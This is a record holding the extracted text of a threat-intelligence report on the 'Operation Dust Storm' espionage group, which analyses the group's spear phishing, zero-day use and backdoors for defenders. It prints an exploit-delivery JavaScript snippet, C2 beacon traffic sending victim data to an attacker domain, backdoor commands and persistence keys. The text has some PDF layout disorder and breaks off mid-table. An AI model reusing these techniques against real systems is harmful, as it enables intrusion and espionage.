{
    "id": "d7b597a8-a7d9-489e-b747-9629b84b0eff",
    "created_at": "2022-10-25T16:48:23.85773Z",
    "updated_at": "2025-03-27T02:16:53.164986Z",
    "deleted_at": null,
    "sha1_hash": "606f656561781dba6fdef666ece6a0cc24709f01",
    "title": "Operation Duststorm",
    "authors": "Cylance",
    "file_creation_date": "2016-02-22T18:39:36Z",
    "file_modification_date": "2016-02-22T18:39:39Z",
    "file_size": 559650,
    "plain_text": "## D U S O P E R AT I O TTTTTN S T O R MMMMM[T]\n\n###### By Jon Gross and\n\n\n## D U S O P E R AT I O TTTTTN S T O R MMMMM[T]\n\n###### By Jon Gross and the Cylance SPEAR™ Team\n\n\n-----\n\n#### “Nothing strengthens  authority so much as\n\n\n#### silence.”\n\n\n###### -Leonardo da Vinci\n\n\n###### 01 Executive Summary 01 The Early Days: Spear Phishing 03 Identity Crisis: Zero-Day Attacks 04 Into the Future: Japanese Targets 05 Here and Now: Companies Compromised 06 Conclusion\n\n 07 Implant Analysis: 07 Misdat Backdoor (2010-2011) 10 MiS-Type Hybrid Backdoor (2012) 13 S-Type Backdoor (2013-2014) 16 Zlib Backdoor (2014-2015)\n\n\n###### EXECUTIVE SUMMARY Cylance SPEAR has uncovered a long-standing persistent threat targeting numerous major industries spread across Japan, South Korea, the United States, Europe, and several other Southeast Asian countries.\n\n Power comes in many forms\nOur research indicates Operation Dust Storm has been\noperational since at least early 2010, and has employed\na number of different operational techniques, including\nspear phishing, waterholes, and zero-day exploits over\ntime. Several antivirus companies initially detected\nearly backdoor samples under the moniker Misdat, but\nthe group has quietly evolved over the years to remain\nundetected and highly effective.\n\nAttack telemetry in 2015 indicates the Dust Storm\ngroup has migrated from more traditional government\nand defense-related intelligence targets to exclusively\nseek out organizations involved in Japanese critical\ninfrastructure and resources.\n\nThe group recently compromised a wide breadth of\nvictims across the following industry verticals: electricity\n**generation, oil and natural gas, finance, transportation,**\n**and construction. SPEAR’s current research indicates**\nthe group’s present focus has shifted to specifically\nand exclusively target Japanese companies or Japanese\nsubdivisions of larger foreign organizations.\n\n\n###### The Early Days: Spear Phishing\nThe earliest indications of the group’s activities stem\nfrom the compile times of the executable resource\nsection of Misdat samples. All of the early backdoor\nsamples were compiled using a version of Delphi which\nnotoriously mangles the compilation timestamp of\nthe file to June 19, 1992 22:22:17 UTC. By using the\nexecutable resource section timestamp, SPEAR was\nable to more accurately gauge the actual compile\ntimes of these samples, and traced one of them,\n\"bc3b36474c24edca4f063161b25bfe0c90b378b9c19c”,\nto January 2010.[1]\n\n\n###### 21 Appendix\n\n\n1 During analysis of older command and control infrastructure, there were several domains that resolved to known malicious IP addresses in\nSeptember 2009 However SPEAR was not able to corroborate these dates in any known malware samples\n\n\nable to more accurately gauge the actual compile\ntimes of these samples, and traced one of them,\n\"bc3b36474c24edca4f063161b25bfe0c90b378b9c19c”,\nto January 2010.[1]\n\n\n-----\n\nVery little public information was available throughout\n2010 on this threat, despite the group’s primary\nbackdoor gaining some level of prominence in targeted\nAsian attacks. This may be explained by the group’s early\nreliance on Dynamic DNS domains for their command and\ncontrol (C2) infrastructure, as well as their use of public\nRATs like Poison Ivy and Gh0st RAT for second-stage\nimplants. The actors relied heavily on the free Dynamic\nDNS providers No-IP (http://www.noip.com), Oray (http://\nwww.oray.com/) and 3322 (http://www.pubyun.com/)\nfor their infrastructure continuing into 2011; the earliest\nknown backdoors SPEAR identified communicated to\n“323332.3322.org” and “1stone.zapto.org”.\n\nIt wasn’t until June 2011 that Operation Dust Storm\nstarted to garner some notoriety from a series of\nattacks which leveraged an unpatched Internet Explorer\n8 vulnerability, CVE-2011-1255, to gain a foothold into\nvictim networks. In these attacks, a link to the exploit was\nsent via a spear phishing email from a purported Chinese\nstudent seeking advice or asking the target a question\nfollowing a presentation. Media coverage of these\nattacks included “http://www.symantec.com/connect/\nblogs/inside-back-door-attack”,[2] and “http://asec.ahnlab.\ncom/730” which named the early backdoor variants\n“Misdat”.\n\nThe secondary C2 server from Symantec’s writeup was\nmentioned in news reports elsewhere as “honeywells.tk”;\nthis domain resolved to “111.1.1.66” during early June\n2011. This address is coincidentally the same IP address\nthat one of the earliest Misdat samples that SPEAR\nidentified beaconed to during the same timeframe.\n\nA paper published in August 2011 by Ned Moran via Usenix\n(https://www.usenix.org/system/files/login/articles/\n105484-Moran.pdf) described in detail an attack by this\n\n\nused the domain “mail.glkjcorp.com” to deliver the\nexploits, and the domain was hosted on the IP address\n“114.108.150.38” at the time of the attack. SPEAR was\nunable to definitively tie this particular exploit site to a\nwatering hole or phishing campaign, however, numerous\nother CN-APT operators leveraged the Internet Explorer\nzero-day during the same period using both techniques.\nThe exploit domain “glkjcorp.com” was registered shortly\nbefore the attack on May 24, 2012. Two different emails\nwere used in the registration of this domain: “effort09 (at)\nhotmail.com” and “zaizhong16 (at) 126.com”.\n\nThis attack was the first to use the file “DeployJava.\njs” to fingerprint installed software on victim systems\nprior to delivery and ensure a known effective exploit\nwas deployed. This JavaScript file was first used\nand documented by Ahnlab a month earlier in the\nGong Da Exploit Kit: http://www.ahnlab.com/kr/site/\nsecurityinfo/secunews/secuNewsView.do?menu_\ndist=2&seq=19418. The “DeployJava.js” worked in\nconjunction with another script embedded in the exploit\npage, to deliver the Flash exploit if the version of IE was\n8 or 9 or deliver the IE zero-day if the version of IE was\n6 or 7.\n\n\nthreat group during April 2011. The attack was initiated by\na spear phishing email that contained a Word document\nembedded with a zero-day Flash exploit (CVE-2011-0611).\nThe final payload described in the report matched other\nconfirmed Misdat samples, and beaconed to “msejake.7766.\norg”, which first resolved to “125.46.42.221”, then later to\n“218.106.246.220” at the time of the attack.\n\nAs to other documented cases, the attacker started\ninteracting with the infected machine within minutes\nof compromise to begin manual network and host\nenumeration.\n\nIn October 2011, the group attempted to take advantage\nof the ongoing Libyan crisis at the time and phish the news\ncycle regarding Muammar Gaddafi’s death on October\n20, 2011. It appears that in addition to some US defense\ntargets, this campaign was also directed at a Uyghur\nmailing list. This time, the group used a specially crafted\nmalicious Windows Help (.hlp) file, which exploited CVE2010-1885. The hlp files, when opened, would execute\na piece of JavaScript code via “mshta.exe”, which in turn\nlaunched a second piece of Visual Basic Script using the\nWindows scripting host. This secondary piece of VBS\ncode was then responsible for decoding the payload from\nthe body of the hlp file and executing it.\n\nThe first stage payloads used in these attacks were\nMisdat variants stored base64 encoded within the hlp\nfile. The samples SPEAR identified both communicated\nto the domain “msevpn.3322.org”, which resolved to the\nIP address “218.106.246.195” at that time. Pivoting off\nof this IP address yielded several additional dynamic DNS\ndomains that were used for command and control, as\nwell as several standard domains that were used by the\ngroup from May 2010 up until December 2015.\n\n\nEarly infrastructure for the 2010-2011 timeframe used\nby the group relied heavily on two email addresses,\n\"wkymyx (at) 126.com” and “duomanmvp (at) 126.com”,\nfor domain registration.\n\nThe attackers typically used either seemingly random\nfour-character subdomains or common words like image,\nblog, ssl, pic, mail, news, etc. There was also evidence to\nsuggest this group attempted to gather user credentials\nfor Yahoo, Windows Live and other accounts through\nseveral different phishing domains during July and\nAugust 2011.\n\nWhile SPEAR was unable to recover the original pages\nserved, the domains these pages were hosted on\nare: “login.live.adobekr.com”, “login.live.wih365.com”,\nand “yahoomail.adobeus.com”. Individual IP address\nresolutions for each of the domains were generally shortlived, with none of them lasting more than a month.\n\n###### Identity Crisis: Zero-Day Attacks\nSPEAR identified another Operation Dust Storm campaign\nin June 2012 that leveraged both CVE-2011-0611, a\nFlash exploit the group had used previously, and CVE2012-1889, an Internet Explorer zero-day. The attackers\n\n```\nif (((i9> -1) ||(i8> -1))&&w7>-1&&ja){\n\n###### flash.Movie = vars;\n}\nelse if((i8>-1)&&(xp>-1)){\n flash.Movie = vars;\n}\nelse if((i6>-1||i7>-1)&&(xp>-1)){\n document.body.innerHTML+=”<object classid=\\”clsid:D27CDB6E-AE6D-11cf-9 6B8-444553540000\\” width=\\”100%\\” height=\\”100%\\” id=\\”ki\\”><param name=\\”mov- ie\\” value=\\””+vars+”\\” /><param name=\\”quality\\” value=\\”high\\” /><param name=\\”bgcolor\\” value=\\”#ffffff\\” /><param name=\\”allowScriptAccess\\” val- ue=\\”sameDomain\\” /><param name=\\”allowFullScreen\\” value=\\”true\\” /><\\/ob- ject>”; setTimeout(“document.body.innerHTML+=\\”<iframe src=faq.htm width=200 height=200><\\/iframe>\\””,2000);\n}\n\n```\n**Figure 2: JavaScript Snippet for Exploit Delivery Choice**\n\n\n###### Registration Email Address Domain Name Date First Registered\n\nwkymyx (at) 126.com amazonwikis.com April 21, 2010\n\nwkymyx (at) 126.com sfcorporation.com May 5, 2010\n\nwkymyx (at) 126.com adobeus.com June 8, 2011\n\nduomanmvp (at) 126.com adobekr.com May 30, 2010\n\nduomanmvp (at) 126.com moviestops.com June 7, 2011\n\nduomanmvp (at) 126.com moviestops.com December 17, 2012\n\n\nThe “DeployJava.js” script was used extensively by other APT groups throughout 2012 and 2013, including Nitro in August of\nthe same year.\n\n```\n                               Figure 1: Domain Registrations for 2010-2011\n\n```\n2 The Symantec article incorrectly states that the Gh0st RAT protocol utilizes SSL, when in fact, it uses Zlib compression.\n\n\n-----\n\n###### hxxp://114.142.147.53/deployJava.js hxxp://59.120.59.2/eng/img/deployJava.js hxxp://67.192.225.83/us/deployJava.js hxxp://98.129.119.156/CFIDE/debug/includes/deployJava.js hxxp://gifas.cechire.com/fr/deployJava.js hxxp://goddess.nexon.com.au/inc/deployJava.js hxxp://java.ree.pl/meeting/deployJava.js hxxp://jcsh-web.com.cn/ADMIN/inc/conn/deployJava.js hxxp://naedco.com/img/common/t/deployJava.js hxxp://songwol.co.kr/employee/deployJava.js hxxp://spacexmt.spacedevcoop.com/checkplayer/deployJava.js hxxp://tavis.tw/tmp/deployJava.js hxxp://www.jcsh-web.com.cn/admin/inc/conn/deployjava.js hxxp://www.jcsh-web.com.cn/ADMIN/inc/conn/deployJava.js hxxp://www.toisengyo.jp/24/11/deployjava.js\n\n**Figure 3: Other Later Targeted Attacks Leveraging DeployJava.js**\n\n\nAlso of note in this attack: the final payload (hxxp://mail.\nglkjcorp.com/pic/win.exe) was delivered encoded with\na single-byte XOR against the byte 0x95, skipping both\nthe key itself and zero in an attempt to avoid exposing\nthe key. This method of obfuscation at the time would\nhave ensured delivery of the payload past most IDS/IPS\nsystems. The unencoded payload was a hybrid of the\nolder Misdat backdoor and its next generation, the S-Type\nbackdoor. The backdoor would first attempt to use the\nold Misdat network protocol and communicate to “smtp.\nadobekr.com”. If that failed, it would fallback to the newer\nHTTP-based S-Type protocol which communicated with\n“mail.glkcorp.com”.\n\nThe group completely abandoned older incarnations of\nthe Misdat backdoor for their first stage implants in 2013,\nand moved predominantly to the new S-Type backdoors.\nA full analysis of both of these backdoors is included in\nthe “Implant Analysis” section.\n\n\n###### Into the Future: Japanese Targets\nSPEAR noticed a fairly large lull in activity from March\n2013 to August 2013. Coincidentally (or perhaps not),\nMandiant released their APT 1 report on February 19, 2013\n(https://www.fireeye.com/blog/threat-research/2013\n/02/mandiant-exposes-apt1-chinas-cyber-espionageunits.html). Activity didn’t cease entirely, but the volume\nof malware SPEAR was able to collect during this period\nwas remarkably decreased.\n\nSeveral new domains were registered during this time\nperiod, which would go on to become the crux of the\ngroup’s operations for the next several years.\n\nThere was some anecdotal evidence to suggest Operation\nDust Storm leveraged an Ichitaro zero-day “CVE-20135990” to target Japanese victims. This zero-day was first\nreported publicly on November 12, 2013. Ichitaro is a\npopular Japanese word processing program designed by\n\n\na company called JustSystems. While SPEAR was unable\nto find the exact sample that delivered a Misdat payload,\nour team analyzed numerous other related samples. The\nbackdoors were encoded within the exploit documents\nusing a very familiar method of XOR’ing skipping zero\nbytes and the key itself; only this time the key used for\nencoding was 0x85.\n\nThroughout 2013, the other incidents SPEAR identified all\ndeployed the S-Type backdoor exclusively. This year also\nmarked an epoch in terms of relying on dual persistence\nlocations in case the victim had lower permissions and\ncouldn’t perform certain actions like writing to the\nregistry or certain file locations. Older techniques like\nusing the “Startup” folder made a resurgence during this\ntime period.\n\nBeginning in February 2014, there was definitive evidence\nto suggest the group used a watering hole attack on a\npopular software reseller to deliver an Internet Explorer\nzero-day, CVE-2014-0322, to a number of unsuspecting\ntargets. The exploit itself was hosted on “hxxp://krtzkj.\nbz.tao123.biz/error/pic.html”, which at the time of the\n\n\n**Figure 5: C2 Domains Registered in 2014 and 2015**\n\n###### Here and Now: Companies Compromised Activity in 2015 was significantly more interesting, and prompted SPEAR to begin studying Operation Dust Storm’s other activities. SPEAR identified a number of second-stage backdoors with hardcoded proxy addresses and credentials. These proxy addresses revealed the attacker had compromised a number of Japanese companies involved in power generation, oil and natural gas, construction, finance, and transportation.\n\n\nattack resolved to “126.85.184.190”. During this same\ntime period, the domain “js.amazonwikis.com” also\npointed to this IP address and was used in previous\nattacks that relied on web-based exploits. The\nintermediate payload “Erido.jpg” was an XOR encoded\nexecutable common to other CVE-2014-0322 attacks,\nwhich ultimately delivered a variant of the S-Type\nbackdoor to the victim.\n\nOperation Dust Storm also began to branch out in\n2014 into establishing and finding alternative means of\npersistence on victim systems. SPEAR identified several\nsecond-stage samples that needed to be installed as a\nServiceDLL in order to work properly, as well as one that\nfunctioned as a router manager for the normal Routing\nand Remote Access Service. Doing a simple search for\nthis registry key, “HKLM\\System\\CurrentControlSet\\\nServices\\RemoteAccess\\RouterManagers\\IP\\DllPath”\nyielded numerous other pieces of malware; however,\nSPEAR was only able to identify one of the group’s samples\nthat took advantage of this. Several new domains were\nalso registered in 2014 to support expanding operations.\n\n\n###### Registration Email Address Domain Name Date First Registered\n\nysymsq (at) 126.com hkabinc.com March 26, 2014\n\nmyexmail (at) aol.com exemail.com March 26, 2014\n\n\nmyexmail (at) aol.com sslmails.com March 6, 2015\n\n\n###### Registration Email Address Domain Name Date First Registered\n\nnewsq13 (at) hotmail.com tomshardpc.com March 27, 2013\n\nnewsq13 (at) hotmail.com wordoscorp.com March 27, 2013\n\nhouqiangliuliu (at) 163.com projectscorp.net October 9, 2013\n\nwantsamsung (at) 21cn.com elecarrow.com October 9, 2013\n\n\nraise of six thousand yen. (http://www.bloomberg.com/\nnews/articles/2015-02-18/japan-auto-workers-seekpay-raise-to-share-in-record-car-profits)\n\nThe second-stage implants were also programmed and\ncompiled using Microsoft Visual Studio 6, an archaic\nversion of Visual Studio that seems to be preferred by\nmalware authors. Despite using an old version of Visual\n\n\n**Figure 4: New C2 Domains Registered in 2013**\n\n\nIn one case that transpired in early February 2015,\nSPEAR was able to recover the second-stage implant\ndelivered by a variant of the S-Type backdoor shortly\nfollowing its initial reconnaissance. What caught our\nattention was the fact that the victim was part of the\ninvestment arm of a major Japanese automaker. The\nattack came just two weeks before eleven unions\nrepresenting Japan’s autoworkers demanded a monthly\n\n\n-----\n\nStudio, the backdoor is well designed by comparison and\nprovides a full suite of functionality to the attacker.\n\n**No antivirus vendors seem to reliably detect most of**\n**the variants SPEAR identified.**\n\nPerhaps even more interesting was the fact that the\ngroup adopted and eventually customized several Android\nbackdoors to suit their purposes in the beginning of 2015.\nThe group rapidly expanded their mobile operations in\nMay 2015. The initial backdoors were relatively simple,\nand would continually forward all SMS messages and\ncall information back to the C2 servers. Later variants\nbecame much more complex, and included the ability to\nenumerate and exfiltrate specific files directly from the\ninfected devices.\n\nAll of the identified victims for the Android Trojans resided\nin Japan or South Korea. The infrastructure to support\n\n\nthe Android campaigns was massive in comparison to\nprevious operations. More than two hundred domains\nhave been identified to date. SPEAR plans to release\nmore information regarding this threat shortly.\n\nSPEAR discovered two more waves of attacks that\nstarted in July 2015 and October 2015. Interestingly, one\nof the primary targets was a Japanese subsidiary of a\nSouth Korean electric utility. Similarly, SPEAR identified\na separate intrusion into a major Japanese oil and gas\ncompany. The exact motivations for this particular\nattack were unclear; however, if this attack coincided\nwith all previous operations, the most likely goals were\nreconnaissance and long-term espionage.\n\n\n###### IMPLANT ANALYSIS MISDAT BACKDOOR (2010-2011)\nMost early samples of Misdat were not packed; however, following what appeared to be heightened awareness by security\nvendors, samples in late 2010 and 2011 were typically packed with the executable packer, UPX version 3.03 (hxxp://upx.\nsourceforge.net/). All of the Misdat samples SPEAR identified were programmed using Borland Delphi, which will mangle the\ndefault PE compile timestamp of a file; as a result, SPEAR was forced to use the resource compile times of samples to get a\nbetter idea of when the actual backdoors were compiled.\n\nFILE CHARACTERISTICS\n\n\n###### SHA256 File Size Resource Compile Time\n\n63bd3f80387e3f2c7130bc3b36474c24\n67,584 Bytes 01-12-2010 19:09:38 UTC\nedca4f063161b25bfe0c90b378b9c19c\n\n74ff3b246fde30bb3c14483279d4b003\n44,544 Bytes 07-07-2010 19:16:28 UTC\n12038957e3956bf8682362044ddccf42\n\n38238f14d63d14075824cc9afd9a3b84\n22,016 Bytes 07-07-2010 19:16:28 UTC\ndf9b9c2f1408ac440458196a9e690db6\n\n2978c6cfff1754c85a4a22b6a72dc9e60b22,016 Bytes 08-16-2011 00:27:02 UTC\n596b54e65ed5ab2c80b8bc259ca5dc\n\n580c7ed2b624a0dfa749909d3e110704\n43,008 Bytes 08-16-2011 00:27:02 UTC\n65bd310663d30fb6fe3532ad45d57b8a\n\n861edc857e53ff072947c2befc3c372c9\n43,008 Bytes 08-16-2011 00:27:02 UTC\na954a7de5c48c53b99c64ff99b69dbd\n\n\n###### CONCLUSION\nAt this time, SPEAR does not believe the attacks were meant to be destructive or disruptive. However, our team believes that\nattacks of this nature on companies involved in Japanese critical infrastructure and resources are ongoing and are likely to\ncontinue to escalate in the future.\n\nIt’s clear from SPEAR’s research that Operation Dust Storm has slowly evolved over time to become increasingly effective.\nEarly operations were extremely blunt, relatively unsophisticated, and readily picked up by the security industry. As the group\nbecame more and more focused on Japan, less and less of their tactics and malware appeared in reports or write-ups. The\ntargets identified escalated both in size and in the scope of affected industries.\n\nAs a result, SPEAR felt obligated to share with the community and public what was discovered recently, to hopefully stunt the\nattackers’ progress for a time. SPEAR has been closely following the aftermath of public reporting. We have decided that even\nthough disclosure often forces attackers to change, it also enables defenders to better detect and expel “real” threats from\ntheir environments.\n\nSPEAR would like to thank the Japanese Computer Emergency Response Team (JP-CERT) for their cooperation, assistance, and\ntime during our investigation.\n\n**_NOTE: A large number of the older Misdat domains were sinkholed by a private entity in late December 2015. The_**\n_domains currently point to the IP address “58.158.177.102”. If anyone has more information or knows who operates_\n_this sinkhole, please contact us at: threat-intel [at] cylance [dot] com._\n\n\n###### File characteristics and resource compile times of known Misdat samples.\n\n HOST-BASED INDICATORS\n\n Volatile Evidence:\n\n- Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprising the volume serial number, decrypted\nnetwork configuration data, and encoded campaign identifier\n\n###### File System Modifications:\n\n- The backdoor will copy itself to %CommonFiles%\\{Unique Identifier}\\msdtc.exe\n\n- It may attempt to open then delete the file C:\\2.hiv, c:\\t2svzmp.kbp, or c:\\tmp.kbm depending on the sample. Later\nversions from 2011 all used c:\\t2svzmp.kbp\n\n###### Registry Modifications:\n\n- The malware may create the registry key HKCU\\Software\\dnimtsoleht\\StubPath, HKCU\\Software\\snimtsOleht\\StubPath,\nor HKCU\\Software\\Backtsaleht\\StubPath for persistence\n\n- In SPEAR’s tests, StubPath always pointed to the newly created msdtc.exe binary within the %CommonFiles% directory,\nwith either the “/ok” or “/start” switch depending on the sample\n\n- May create the Registry Key HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8b5c1-bd56d32fbda7} or HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c170c2c3bc7905}\n\n\n4241a9371023e7452475117ff1fcd672\n23,040 bytes 10-21-2011 20:05:48 UTC\n62dab56bf1943b5e0c73ff2b2e41f876\n\n\n-----\n\n###### NETWORK-BASED INDICATORS\nObserved network traffic was always base64 encoded plain text over a raw socket to common ports like 80, 443, or 1433. A\nsample initial beacon packet is shown below.\n\n\nlogon|{Hostname}|Windows XP|100112|bd56d32fbda703a98c87689c92325d90|\n\n\n**Figure 6: Initial Beacon Packet Base64 Decoded**\n\nThe string “logon” always preceded any other information. In the instance above, the hostname of the victim’s system,\noperating system version, unique sample identifier (SPEAR believes this is a date: 1/12/2010), as well as the unique MD5\nused for the mutex were sent to the server. Once it registers with the C2, the backdoor sends the string “YWN0aXZlfA==”\nwhich decodes to “active|”. The backdoor will then continue to send that string and wait until it receives one of the following\ncommands from the C2 server:\n\n\n###### def decode_chars(a, b):   return chr((26 * (ord(a) - ord('A'))) + (ord(b) - ord('A')))\n```\ndef decode(s):\n\n rolling_key = 0x783 result = \"\" for index in xrange(len(s)/2): result += decode_chars(s[index * 2], s[(index * 2) + 1]) real_result = \"\"\n   for index in xrange(len(result)):\n i = index + 1 real_result += chr(((rolling_key >> 8) & 0xff) ^ ord(result[i - 1])) rolling_key = 0xdbd9 * (ord(decode_chars(s[index * 2], s[(index * 2) + 1])) + rolling_key) + 0xda3b\n   return real_result\n\n```\n**Figure 8: Python Script for Decoding Obfuscated Misdat Strings**\n\n\n###### Command Function\n\nInitiates a new connection that provides shell functionality to the attacker to\nshell\nexecute commands. Subcommands include shellstart, command and stop.\n\nInitiates a new connection that provides file management and enumeration\nfiles capabilities to the attacker. Subcommands include filelist, dirlist, driver (enumerates logical drives), renamefile, delete, run, open and stop.\n\nupload Provides the ability to upload files directly to the C2.\n\ndown Provides the ability to download files from the C2.\n\nrestart Restarts the victim system through a call to the Windows API ExitWindowsEx.\n\ncloseos Shuts down the system via ExitWindowsEx API.\n\ndclose Closes the socket connection to the C2.\n\nuclose Appears to do the same as the dclose command.\n\n\nDeletes the Active Setup registry key and deletes the backdoor before termiunintall\nnating the process.\n\n\n**Figure 7: Network Commands Supported by the Misdat Backdoor**\n###### DETAILS\nThe backdoors were relatively simple and provided the attacker the ability to upload and download files, manipulate and\nenumerate files, execute shell commands, disconnect from the C2, uninstall the backdoor, and shutdown or restart the system.\nThe backdoors could also potentially take the command line parameters “/ok” or “/start”; the switches changed the user context\nunder which the process runs. If no switch was provided when executed, the backdoor will copy itself to “%CommonFiles%\\\n{Unique Identifier}\\msdtc.exe”, where the unique identifier is the first ten characters of the MD5 hash used as the mutex. It will\nthen configure one of the Active Setup and associated registry keys above to establish persistence on the system.\n\nSPEAR identified and reversed the encoding mechanism used for obfuscating network callback information and what appeared\nto be a unique campaign identifier. The following script can be used to decode these obfuscated strings.\n\n\nFILE CHARACTERISTICS\n\n###### SHA256 Campaign ID Network Callback\n\n63bd3f80387e3f2c7130bc3b36474c24 Domain: 323332.3322.org\nWNA\nedca4f063161b25bfe0c90b378b9c19c Ports: 80, 443, 1433\n\n74ff3b246fde30bb3c14483279d4b003 Domain: 323332.3322.org\nXSI\n12038957e3956bf8682362044ddccf42 Ports: 80,443, 1433\n\n38238f14d63d14075824cc9afd9a3b84 Domain: msejake.7766.org\nUAL\ndf9b9c2f1408ac440458196a9e690db6 Ports: 80, 443, 1433\n\n2978c6cfff1754c85a4a22b6a72dc9e6 Domain: msevpn.3322.org\nQPO\n0b596b54e65ed5ab2c80b8bc259ca5dc Ports: 80, 443, 8080\n\n580c7ed2b624a0dfa749909d3e1107046 Domain: msevpn.3322.org\nQPO\n5bd310663d30fb6fe3532ad45d57b8a Ports: 80, 443, 8080\n\n861edc857e53ff072947c2befc3c372c9a Domain: msevpn.3322.org\nQPO\n954a7de5c48c53b99c64ff99b69dbd Ports: 80, 443, 8080\n\n4241a9371023e7452475117ff1fcd672 Domain: msevpn.3322.org\nYAM\n62dab56bf1943b5e0c73ff2b2e41f876 Ports: 80, 443, 8080\n\n\n**Figure 9: Decoded Campaign Identifiers and Network Callback Information**\n\nAlso of interest was the fact that all of the samples would attempt to detect whether or not the victim was using a Japanese\nkeyboard via a call to the Windows API “GetKeyboardType” and report that fact back to the attacker.\n\n\n-----\n\n###### MIS-TYPE HYBRID BACKDOOR (2012)\n\nIn 2012, Operation Dust Storm slowly migrated to a hybridized backdoor, which actually contained two entirely separate\nbackdoors within the same binary. This backdoor would first attempt to establish an interactive shell using the Misdat base64\nencoded network protocol over a raw TCP socket. If the initial communication to the first C2 failed, the backdoor would fallback\nto a secondary HTTP-based protocol and communicate to an alternate C2. Hybrid variants SPEAR identified were compressed\nwith UPX version 3.03.\n\nFILE CHARACTERISTICS\n\n\n###### POST /index.asp HTTP/1.1 Accept: Accept: */*, /index.asp, mail.glkjcorp.com Content-Type: application/x-www-form-urlencoded User-Agent: FirefoxApp Host: mail.glkjcorp.com Content-Length: 334 Cache-Control: no-cache\n\n id=e263314342d1f1b9&type=post&stype=info&data=V2luZG93cyBYUA0KTUFMV0FSRS9j- dWNrb28vQWRta W5pc3RyYXRvcnMNCkNyZWF0ZSBVc2VyIExvc3RfZTI2MzMxI- FN1Y2Nlc3MuDQpDcmVhdGUgRGlyIFN1Y2Nlc3 MuDQpXcml0ZSBSZWdLZXkgRX- Jyb3IuDQpGaWxlU3lzdGVtIDogTlRGUw0KU3lzdGVtIFJ1blRpbWU6MCBkYXkwI GhvdXJzMTUgbWludXRlcw0KDQoNCiBDb3VudCA9IDANCk9wZW5TY01hbmFnZXIgT0suDQo=\n\n**Figure 11: Initial S-Type Beacon**\n\n\n###### SHA256 File Size Resource Compile Time\n\nb1aed59dc59a4ef4c7d2b6e67983e4867e\n30,720 Bytes 02-23-2012 14:47:18 UTC\n04ba35c42372eb3b6ad969bd6a6041\n\n93c1c7a666833f5f68d2315dc014dc6c2\n30,720 Bytes 06-18-2012 22:39:02 UTC\n446c91c848130e228e84376b0aaf441\n\n\n**Figure 10: File Details of the Hybrid Backdoors**\n\n###### HOST-BASED INDICATORS Volatile Evidence:\n\n- Will create a 32-bit Mutex based upon the MD5 hash of a unique string comprised of the volume serial number, decrypted\nnetwork configuration data, encoded network configuration data, and encoded campaign identifier\n\n- May create a temporary user on the system named “Lost_{Unique Identifier}” with the password “fuck~!@6”{Unique\nIdentifier}”\n\n- May create the folder %System%\\{Unique Identifier} temporarily.\n\n- May create files in %AppData%\\{Unique Identifier} that end in “tmp.exe”\n\n- May create the files:\n\n   - %AppData%\\{Unique Identifier}\\HOSTRURKLSR\n\n   - Contains the results of the command “cmd.exe /c ipconfig /all”\n\n   - %AppData%\\{Unique Identifier}\\NEWERSSEMP\n\n   - Contains the results of the command “cmd.exe /c net user {Username}”\n\n###### File System Modifications:\n\n- The backdoor will copy itself to %AppData%\\{Unique Identifier}\\msdtc.exe – where the unique identifier is the first ten\ncharacters of the MD5 hash\n\n###### Registry Modifications:\n\n- The malware may create the registry key HKCU\\Software\\bkfouerioyou\n\n   - Creates the value StubPath pointing to %AppData%\\{Unique Identifier}\\msdtc.exe\n\n- Will create one of these registry keys for persistence:\n\n   - HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1{Unique Identifier} – First 12bytes\n\n   - HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1{Unique Identifier} – First 12bytes\n\n###### NETWORK-BASED INDICATORS\nThe malware will make DNS requests for the domains “smtp.adobekr.com” and “mail.glkjcorp.com” or “auto.glkjcorp.com”.\nBoth samples were configured to communicate first to “smtp.adobekr.com” using the Misdat network protocol described\nabove over TCP port 80, 443, and 25. If a response was not received from the C2, the samples would fallback to the secondary\nHTTP protocol and communicate to the alternate C2 using the same TCP ports.\n\n\nThe initial POST request always used the static User-Agent “FirefoxApp” and contained operating system information, user\ninformation, the results of several permissions tests, the file system, and system uptime. If the backdoor did not receive a\nresponse, it would then try to communicate the same base64 encoded information in the URI of a GET request.\n\n\n###### Windows XP {Hostname}/{Username}/Administrators Create User Lost_e26331 Success. Create Dir Success. Write RegKey Error. FileSystem : NTFS System RunTime:0 day0 hours15 minutes Count = 0 OpenScManager OK.\n\n**Figure 12: Contents of the Decoded POST Request from the Figure Above**\n\n\nFollow-on requests used the User-Agent of the default browser on the system as evidenced below.\n\n\n###### GET /index.asp?mmid=e263314342d1f1b9 HTTP/1.1 Accept: */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322) Accept-Encoding: gzip, deflate Host: mail.glkjcorp.com Connection: Keep-AliveOpenScManager OK.\n\n**Figure 13: Follow-on HTTP Traffic**\n\n\nThe id and mmid fields in the figures above both used the first 16 characters of the unique identifier created for the mutex. The\nMisdat protocol provided the attacker most of the features of a full-fledged backdoor, while the secondary protocol appeared\nto primarily be used as an update mechanism to load additional malware on the system.\n\n\n-----\n\n###### NETWORK-BASED INDICATORS DETAILS\nThe backdoor could be executed with three different switches, “/ok”, “/Start”, or “/fuck”. These switches affected the context\nunder which the process would be run and whether or not the binary would delete itself once executed.\n\n\n###### S-TYPE BACKDOOR (2013-2014)\nAfter experimenting with a hybrid of the Misdat and S-Type backdoors, in 2013 Operation Dust Storm abandoned the earlier\nMisdat network protocol entirely. This was likely a direct result of the demonstrated effectiveness of an HTTP-based protocol\nfor command and control, or simply an adaptation to more corporations leveraging web-based proxies. All samples identified\nwere programmed using Borland Delphi and made use of custom classes to implement common backdoor functionality. The\nmajority of samples SPEAR identified in 2013 were packed with UPX version 3.03, while later 2014 variants were not.\n\nFILE CHARACTERISTICS\n\n\n###### Switch Descriptive Purpose Self-Delete\n\nExecuted the malware directly under the current running process using the context\n/ok No\nof the user that started the application (can be system).\n\nExecuted the malware under explorer.exe in the context of whatever user executed\n/Start the application (can be system). This was the switch used by the malware when No\nsetting persistence in the registry.\n\nForced execution of the malware under explorer.exe in the context of the user\n/fuck No\nrunning explorer.exe (scanned active processes and located the explorer 